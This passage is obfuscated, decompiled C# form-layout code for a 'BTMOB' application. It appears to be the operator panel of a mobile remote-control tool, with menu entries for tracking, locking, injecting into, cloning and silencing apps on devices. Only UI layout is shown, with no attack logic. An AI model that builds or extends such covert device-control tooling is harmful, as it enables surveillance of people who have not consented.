		this.ToolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
		this.ToolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
		this.ClearAllToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator5 = new System.Windows.Forms.ToolStripSeparator();
		this.ToolStripMenuItem8 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem9 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator6 = new System.Windows.Forms.ToolStripSeparator();
		this.ToolStripMenuItem11 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem10 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator7 = new System.Windows.Forms.ToolStripSeparator();
		this.ToolStripMenuItem14 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem13 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator8 = new System.Windows.Forms.ToolStripSeparator();
		this.ToolStripMenuItem12 = new System.Windows.Forms.ToolStripMenuItem();
		this.CloneAppToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.statetimer = new System.Windows.Forms.Timer(this.components);
		this.Panel35 = new System.Windows.Forms.Panel();
		this.refbtm = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.emptysearch = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.searchtext = new DrakeUI.Framework.DrakeUITextBox();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.DrakeUITabControl1 = new DrakeUI.Framework.DrakeUITabControl();
		this.TabPage1 = new System.Windows.Forms.TabPage();
		this.TabPage2 = new System.Windows.Forms.TabPage();
		this.DGV_CLONE = new System.Windows.Forms.DataGridView();
		this.DataGridViewImageColumn1 = new System.Windows.Forms.DataGridViewImageColumn();
		this.DataGridViewTextBoxColumn1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.appType = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ishidnclum = new System.Windows.Forms.DataGridViewImageColumn();
		this.ctxclones = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.OpenCloneToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RemoveCloneToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.disablebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W11 = new DrakeUI.Framework.DrakeWidth_W();
		this.enablebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGV0).BeginInit();
		this.ctxapps.SuspendLayout();
		this.Panel35.SuspendLayout();
		this.Panel3.SuspendLayout();
		this.DrakeUITabControl1.SuspendLayout();
		this.TabPage1.SuspendLayout();
		this.TabPage2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGV_CLONE).BeginInit();
		this.ctxclones.SuspendLayout();
		this.Panel2.SuspendLayout();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(1076, 5);
		this.minibtn.Location = new System.Drawing.Point(1118, 5);
		this.closbtn.Location = new System.Drawing.Point(1160, 5);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(1192, 16);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(1202, 24);
		this.DGV0.AllowUserToAddRows = false;
		this.DGV0.AllowUserToDeleteRows = false;
		this.DGV0.AllowUserToResizeColumns = false;
		this.DGV0.AllowUserToResizeRows = false;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV0.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.DGV0.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGV0.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV0.BackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGV0.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV0.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV0.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
		this.DGV0.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle2.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 10f, System.Drawing.FontStyle.Bold);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.DGV0.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGV0.Columns.AddRange(this.apicoclm, this.numnamclm, this.numculm, this.acctclum, this.instlclum, this.isenbld, this.islockd, this.istrked, this.jcticoclm, this.blkdclum, this.favclumn);
		this.DGV0.ContextMenuStrip = this.ctxapps;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle3.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 10f, System.Drawing.FontStyle.Bold);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV0.DefaultCellStyle = dataGridViewCellStyle3;
		this.DGV0.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGV0.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGV0.EnableHeadersVisualStyles = false;
		this.DGV0.GridColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGV0.Location = new System.Drawing.Point(9, 10);
		this.DGV0.MultiSelect = false;
		this.DGV0.Name = EXGuarder._7311142D;
		this.DGV0.ReadOnly = true;
		this.DGV0.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle4.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 10f, System.Drawing.FontStyle.Bold);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV0.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.DGV0.RowHeadersVisible = false;
		this.DGV0.RowHeadersWidth = 51;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV0.RowsDefaultCellStyle = dataGridViewCellStyle5;
		this.DGV0.RowTemplate.Height = 24;
		this.DGV0.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV0.Size = new System.Drawing.Size(1184, 626);
		this.DGV0.TabIndex = 41;
		this.apicoclm.FillWeight = 22.73192f;
		this.apicoclm.HeaderText = EXGuarder._2421351E;
		this.apicoclm.ImageLayout = System.Windows.Forms.DataGridViewImageCellLayout.Zoom;
		this.apicoclm.MinimumWidth = 6;
		this.apicoclm.Name = EXGuarder._2F421048;
		this.apicoclm.ReadOnly = true;
		this.numnamclm.FillWeight = 29.54272f;
		this.numnamclm.HeaderText = EXGuarder._6C290B1E;
		this.numnamclm.MinimumWidth = 6;
		this.numnamclm.Name = EXGuarder._4D796D57;
		this.numnamclm.ReadOnly = true;
		this.numculm.FillWeight = 19.24345f;
		this.numculm.HeaderText = EXGuarder._685B782B;
		this.numculm.MinimumWidth = 6;
		this.numculm.Name = EXGuarder._330A213C;
		this.numculm.ReadOnly = true;
		this.acctclum.FillWeight = 42.63845f;
		this.acctclum.HeaderText = EXGuarder._60736D03;
		this.acctclum.MinimumWidth = 6;
		this.acctclum.Name = EXGuarder._48401556;
		this.acctclum.ReadOnly = true;
		this.instlclum.FillWeight = 54.72881f;
		this.instlclum.HeaderText = EXGuarder._47631724;
		this.instlclum.MinimumWidth = 6;
		this.instlclum.Name = EXGuarder._49425F40;
		this.instlclum.ReadOnly = true;
		this.isenbld.FillWeight = 20.31201f;
		this.isenbld.HeaderText = EXGuarder._2F766D02;
		this.isenbld.MinimumWidth = 6;
		this.isenbld.Name = EXGuarder._290D416C;
		this.isenbld.ReadOnly = true;
		this.islockd.FillWeight = 19.75272f;
		this.islockd.HeaderText = EXGuarder._5E592237;
		this.islockd.MinimumWidth = 6;
		this.islockd.Name = EXGuarder._3001641D;
		this.islockd.ReadOnly = true;
		this.istrked.FillWeight = 19.22801f;
		this.istrked.HeaderText = EXGuarder._57794316;
		this.istrked.MinimumWidth = 6;
		this.istrked.Name = EXGuarder._51727200;
		this.istrked.ReadOnly = true;
		this.jcticoclm.FillWeight = 18.73568f;
		this.jcticoclm.HeaderText = EXGuarder._072C6066;
		this.jcticoclm.MinimumWidth = 6;
		this.jcticoclm.Name = EXGuarder._2A3F5A02;
		this.jcticoclm.ReadOnly = true;
		this.blkdclum.FillWeight = 16.01603f;
		this.blkdclum.HeaderText = EXGuarder._172A0E2C;
		this.blkdclum.MinimumWidth = 6;
		this.blkdclum.Name = EXGuarder._6B495322;
		this.blkdclum.ReadOnly = true;
		this.favclumn.FillWeight = 18f;
		this.favclumn.HeaderText = EXGuarder._6E246228;
		this.favclumn.MinimumWidth = 6;
		this.favclumn.Name = EXGuarder._1A443D3B;
		this.favclumn.ReadOnly = true;
		this.ctxapps.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ctxapps.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.ctxapps.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.ctxapps.Items.AddRange(new System.Windows.Forms.ToolStripItem[24]
		{
			this.ToolStripMenuItem1, this.ToolStripSeparator4, this.ToolStripMenuItem2, this.ToolStripMenuItem5, this.ToolStripSeparator1, this.ToolStripMenuItem4, this.ToolStripMenuItem3, this.ToolStripSeparator2, this.ToolStripMenuItem6, this.ToolStripMenuItem7,
			this.ToolStripSeparator3, this.ClearAllToolStripMenuItem, this.ToolStripSeparator5, this.ToolStripMenuItem8, this.ToolStripMenuItem9, this.ToolStripSeparator6, this.ToolStripMenuItem11, this.ToolStripMenuItem10, this.ToolStripSeparator7, this.ToolStripMenuItem14,
			this.ToolStripMenuItem13, this.ToolStripSeparator8, this.ToolStripMenuItem12, this.CloneAppToolStripMenuItem
		});
		this.ctxapps.Name = EXGuarder._5B5D0461;
		this.ctxapps.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.ctxapps.Size = new System.Drawing.Size(253, 532);
		this.ToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ToolStripMenuItem1.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.ToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem1.Image = BTMOB.My.Resources.Resources.startapp;
		this.ToolStripMenuItem1.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem1.Name = EXGuarder._00484956;
		this.ToolStripMenuItem1.Size = new System.Drawing.Size(252, 30);
		this.ToolStripMenuItem1.Text = EXGuarder._3E5A051F;
		this.ToolStripSeparator4.BackColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ToolStripSeparator4.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ToolStripSeparator4.Name = EXGuarder._5716061A;
		this.ToolStripSeparator4.Size = new System.Drawing.Size(249, 6);
		this.ToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ToolStripMenuItem2.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.ToolStripMenuItem2.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem2.Image = BTMOB.My.Resources.Resources.track;
		this.ToolStripMenuItem2.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem2.Name = EXGuarder._68105B6E;
		this.ToolStripMenuItem2.Size = new System.Drawing.Size(252, 30);
		this.ToolStripMenuItem2.Text = EXGuarder._002D712A;
		this.ToolStripMenuItem5.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.ToolStripMenuItem5.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem5.Image = BTMOB.My.Resources.Resources.notrkapp;
		this.ToolStripMenuItem5.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem5.Name = EXGuarder._04483159;
		this.ToolStripMenuItem5.Size = new System.Drawing.Size(252, 30);
		this.ToolStripMenuItem5.Text = EXGuarder._0B3C3161;
		this.ToolStripSeparator1.BackColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ToolStripSeparator1.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ToolStripSeparator1.Name = EXGuarder._5B2C264E;
		this.ToolStripSeparator1.Size = new System.Drawing.Size(249, 6);
		this.ToolStripMenuItem4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ToolStripMenuItem4.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.ToolStripMenuItem4.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem4.Image = BTMOB.My.Resources.Resources.enblapp;
		this.ToolStripMenuItem4.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem4.Name = EXGuarder._472F2407;
		this.ToolStripMenuItem4.Size = new System.Drawing.Size(252, 30);
		this.ToolStripMenuItem4.Text = EXGuarder._0F423365;
		this.ToolStripMenuItem3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ToolStripMenuItem3.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.ToolStripMenuItem3.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem3.Image = BTMOB.My.Resources.Resources.displeapp;
		this.ToolStripMenuItem3.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem3.Name = EXGuarder._2C694D47;
		this.ToolStripMenuItem3.Size = new System.Drawing.Size(252, 30);
		this.ToolStripMenuItem3.Text = EXGuarder._7629450C;
		this.ToolStripSeparator2.BackColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ToolStripSeparator2.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ToolStripSeparator2.Name = EXGuarder._52481B01;
		this.ToolStripSeparator2.Size = new System.Drawing.Size(249, 6);
		this.ToolStripMenuItem6.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.ToolStripMenuItem6.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem6.Image = BTMOB.My.Resources.Resources.lockapp;
		this.ToolStripMenuItem6.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem6.Name = EXGuarder._11246576;
		this.ToolStripMenuItem6.Size = new System.Drawing.Size(252, 30);
		this.ToolStripMenuItem6.Text = EXGuarder._68161D18;
		this.ToolStripMenuItem7.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.ToolStripMenuItem7.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem7.Image = BTMOB.My.Resources.Resources.unlokapp;
		this.ToolStripMenuItem7.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem7.Name = EXGuarder._086B0102;
		this.ToolStripMenuItem7.Size = new System.Drawing.Size(252, 30);
		this.ToolStripMenuItem7.Text = EXGuarder._49506E62;
		this.ToolStripSeparator3.BackColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ToolStripSeparator3.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ToolStripSeparator3.Name = EXGuarder._0B513B1F;
		this.ToolStripSeparator3.Size = new System.Drawing.Size(249, 6);
		this.ClearAllToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ClearAllToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.ClearAllToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.ClearAllToolStripMenuItem.Image = BTMOB.My.Resources.Resources.delapp;
		this.ClearAllToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ClearAllToolStripMenuItem.Name = EXGuarder._6A32194A;
		this.ClearAllToolStripMenuItem.Size = new System.Drawing.Size(252, 30);
		this.ClearAllToolStripMenuItem.Text = EXGuarder._48224D0D;
		this.ToolStripSeparator5.BackColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ToolStripSeparator5.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ToolStripSeparator5.Name = EXGuarder._41195103;
		this.ToolStripSeparator5.Size = new System.Drawing.Size(249, 6);
		this.ToolStripMenuItem8.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.ToolStripMenuItem8.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem8.Image = BTMOB.My.Resources.Resources.ject1;
		this.ToolStripMenuItem8.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem8.Name = EXGuarder._6060180D;
		this.ToolStripMenuItem8.Size = new System.Drawing.Size(252, 30);
		this.ToolStripMenuItem8.Text = EXGuarder._072C6066;
		this.ToolStripMenuItem9.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.ToolStripMenuItem9.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem9.Image = BTMOB.My.Resources.Resources.noject;
		this.ToolStripMenuItem9.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem9.Name = EXGuarder._1A260B3F;
		this.ToolStripMenuItem9.Size = new System.Drawing.Size(252, 30);
		this.ToolStripMenuItem9.Text = EXGuarder._2407725C;
		this.ToolStripSeparator6.BackColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ToolStripSeparator6.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ToolStripSeparator6.Name = EXGuarder._211E370F;
		this.ToolStripSeparator6.Size = new System.Drawing.Size(249, 6);
		this.ToolStripMenuItem11.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem11.Image = BTMOB.My.Resources.Resources.mobile_block_24dp_91A3B6_FILL1_wght400_GRAD0_opsz24;
		this.ToolStripMenuItem11.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem11.Name = EXGuarder._3E070134;
		this.ToolStripMenuItem11.Size = new System.Drawing.Size(252, 30);
		this.ToolStripMenuItem11.Text = EXGuarder._08181869;
		this.ToolStripMenuItem10.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem10.Image = BTMOB.My.Resources.Resources.mobile_text_24dp_91A3B6_FILL1_wght400_GRAD0_opsz24;
		this.ToolStripMenuItem10.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem10.Name = EXGuarder._2A310504;
		this.ToolStripMenuItem10.Size = new System.Drawing.Size(252, 30);
		this.ToolStripMenuItem10.Text = EXGuarder._31483F11;
		this.ToolStripSeparator7.BackColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ToolStripSeparator7.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ToolStripSeparator7.Name = EXGuarder._5C1D6D4E;
		this.ToolStripSeparator7.Size = new System.Drawing.Size(249, 6);
		this.ToolStripMenuItem14.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem14.Image = BTMOB.My.Resources.Resources.favhart_off;
		this.ToolStripMenuItem14.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem14.Name = EXGuarder._070A663C;
		this.ToolStripMenuItem14.Size = new System.Drawing.Size(252, 30);
		this.ToolStripMenuItem14.Text = EXGuarder._6E246228;
		this.ToolStripMenuItem13.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem13.Image = BTMOB.My.Resources.Resources.unfavhart;
		this.ToolStripMenuItem13.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem13.Name = EXGuarder._3B5B0C3D;
		this.ToolStripMenuItem13.Size = new System.Drawing.Size(252, 30);
		this.ToolStripMenuItem13.Text = EXGuarder._31010411;
		this.ToolStripSeparator8.BackColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ToolStripSeparator8.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ToolStripSeparator8.Name = EXGuarder._04312D16;
		this.ToolStripSeparator8.Size = new System.Drawing.Size(249, 6);
		this.ToolStripMenuItem12.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem12.Image = BTMOB.My.Resources.Resources.silentnoty;
		this.ToolStripMenuItem12.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem12.Name = EXGuarder._25706C5C;
		this.ToolStripMenuItem12.Size = new System.Drawing.Size(252, 30);
		this.ToolStripMenuItem12.Text = EXGuarder._646E3841;
		this.CloneAppToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.CloneAppToolStripMenuItem.Image = BTMOB.My.Resources.Resources.cloneapp;
		this.CloneAppToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.CloneAppToolStripMenuItem.Name = EXGuarder._4A177567;
		this.CloneAppToolStripMenuItem.Size = new System.Drawing.Size(252, 30);
		this.CloneAppToolStripMenuItem.Text = EXGuarder._482E2432;
		this.Panel35.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel35.Controls.Add(this.refbtm);
		this.Panel35.Controls.Add(this.emptysearch);
		this.Panel35.Controls.Add(this.searchtext);
		this.Panel35.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel35.Location = new System.Drawing.Point(0, 0);
		this.Panel35.Name = EXGuarder._396B4936;
		this.Panel35.Padding = new System.Windows.Forms.Padding(10);
		this.Panel35.Size = new System.Drawing.Size(1202, 46);
		this.Panel35.TabIndex = 54;
		this.refbtm.Cursor = System.Windows.Forms.Cursors.Hand;
		this.refbtm.Dock = System.Windows.Forms.DockStyle.Left;
		this.refbtm.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refbtm.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.refbtm.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refbtm.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refbtm.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refbtm.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.refbtm.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.refbtm.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refbtm.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refbtm.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.refbtm.Location = new System.Drawing.Point(10, 10);
		this.refbtm.Name = EXGuarder._79083E1F;
		this.refbtm.Radius = 15;
		this.refbtm.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.refbtm.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.refbtm.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refbtm.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refbtm.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.refbtm.Size = new System.Drawing.Size(149, 26);
		this.refbtm.Style = DrakeUI.Framework.UIStyle.Custom;
		this.refbtm.Symbol = 61473;
		this.refbtm.TabIndex = 47;
		this.refbtm.Text = EXGuarder._0B1D0119;
		this.emptysearch.Cursor = System.Windows.Forms.Cursors.Hand;
		this.emptysearch.Dock = System.Windows.Forms.DockStyle.Right;
		this.emptysearch.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.emptysearch.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.emptysearch.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.emptysearch.Location = new System.Drawing.Point(946, 10);
		this.emptysearch.Name = EXGuarder._783B245F;
		this.emptysearch.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.emptysearch.RectColor = System.Drawing.Color.Gray;
		this.emptysearch.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.emptysearch.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.emptysearch.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.emptysearch.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.emptysearch.Size = new System.Drawing.Size(40, 26);
		this.emptysearch.Style = DrakeUI.Framework.UIStyle.Custom;
		this.emptysearch.Symbol = 77;
		this.emptysearch.SymbolSize = 25;
		this.emptysearch.TabIndex = 14;
		this.emptysearch.Visible = false;
		this.searchtext.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.searchtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.searchtext.Dock = System.Windows.Forms.DockStyle.Right;
		this.searchtext.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.searchtext.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.searchtext.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f, System.Drawing.FontStyle.Bold);
		this.searchtext.ForeColor = System.Drawing.Color.White;
		this.searchtext.Location = new System.Drawing.Point(986, 10);
		this.searchtext.Margin = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.searchtext.Maximum = 2147483647.0;
		this.searchtext.Minimum = -2147483648.0;
		this.searchtext.Name = EXGuarder._6A44533B;
		this.searchtext.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.searchtext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.searchtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.searchtext.Size = new System.Drawing.Size(206, 25);
		this.searchtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.searchtext.TabIndex = 13;
		this.searchtext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.searchtext.Watermark = EXGuarder._2B6D2D4B;
		this.Panel3.Controls.Add(this.DGV0);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel3.Location = new System.Drawing.Point(0, 46);
		this.Panel3.Name = EXGuarder._64343D18;
